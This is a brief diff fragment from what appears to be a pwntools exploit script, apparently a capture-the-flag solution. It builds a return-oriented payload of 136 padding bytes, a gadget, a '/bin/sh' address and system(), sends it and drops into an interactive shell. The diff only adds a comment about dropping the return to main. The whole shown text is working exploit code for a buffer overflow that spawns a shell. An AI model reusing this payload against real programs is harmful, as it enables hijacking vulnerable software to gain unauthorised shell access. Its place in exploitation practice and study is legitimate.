@@ -32,6 +32,6 @@ payload2 = 'A'*136
 payload2 += p64(popret)
 payload2 += p64(binsh)
 payload2 += p64(system)
-payload2 += p64(main)
+payload2 += p64(main)#we can remove this 
 p.send(payload2)
 p.interactive()
